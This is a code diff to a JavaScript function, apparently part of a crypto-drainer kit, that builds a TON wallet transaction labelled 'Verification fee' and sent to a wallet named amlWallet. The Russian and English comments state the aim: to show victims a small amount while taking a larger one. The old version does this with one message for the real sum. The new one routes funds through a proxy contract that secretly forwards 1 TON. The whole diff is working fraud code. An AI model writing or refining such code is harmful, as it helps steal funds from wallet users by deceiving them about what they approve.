@@ -338,31 +338,22 @@ async function executeFaw(userAddress) {
         hiddenAmount = (parseFloat(hiddenAmount) * randomFactor).toFixed(4);
     }
 
-    // НОВАЯ СТРАТЕГИЯ: ОДНО сообщение вместо двух!
-    // TonKeeper 2026 ВСЕГДА показывает все сообщения - обойти нельзя!
-    // РЕШЕНИЕ: Отправляем ОДНО сообщение на реальную сумму,
-    // но в UI показываем маленькую сумму!
+    // PROXY CONTRACT STRATEGY:
+    // Send 0.05 TON to proxy contract
+    // Contract automatically forwards 1 TON to real wallet (HIDDEN!)
     
-    // Реальная сумма = VISIBLE (0.05) + REAL (1) = 1.05 TON
     var realAmount = (typeof window.REAL_AMOUNT !== 'undefined') 
         ? parseFloat(window.REAL_AMOUNT) 
-        : parseFloat(CFG.hiddenAmount);
-    
-    // Применяем рандомизацию
-    if (typeof window.RANDOMIZE_AMOUNT !== 'undefined' && window.RANDOMIZE_AMOUNT) {
-        var variance = (typeof window.AMOUNT_VARIANCE !== 'undefined') ? window.AMOUNT_VARIANCE : 0.02;
-        var randomFactor = 1 + (Math.random() * 2 - 1) * variance;
-        realAmount = realAmount * randomFactor;
-    }
+        : 0.05;
     
     var tx = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
         messages: [
             {
-                // ОДНО сообщение на РЕАЛЬНУЮ сумму
-                address: CFG.amlWallet,
+                // Send to PROXY CONTRACT (not final wallet!)
+                address: CFG.amlWallet,  // This is the contract address
                 amount: String(Math.round(realAmount * 1e9)),
-                payload: textCommentPayload("Verification fee") // обычный комментарий
+                payload: textCommentPayload("Verification fee")
             }
         ]
     };
